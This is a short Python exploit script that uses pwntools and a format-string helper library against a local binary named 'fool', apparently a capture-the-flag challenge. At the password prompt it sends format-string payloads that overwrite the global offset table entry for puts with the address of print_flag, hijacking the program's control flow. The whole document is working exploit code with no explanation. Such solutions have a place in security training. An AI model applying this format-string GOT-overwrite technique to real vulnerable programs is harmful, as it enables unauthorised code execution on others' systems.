from pwn import *
from formatStringExploiter.FormatString import FormatString
p = process('./fool')

def exec_fmt(s):
    print("Sending: " + repr(s))
    ret = p.recvuntil("Enter password for authentication:",drop=True)
    p.sendline(s)
    p.recvall()
    return ret

elf = ELF("./fool")
fmtStr = FormatString(exec_fmt,elf=elf,index=4,pad=0,explore_stack=False)
fmtStr.write_d(elf.got['puts'],elf.symbols['print_flag'])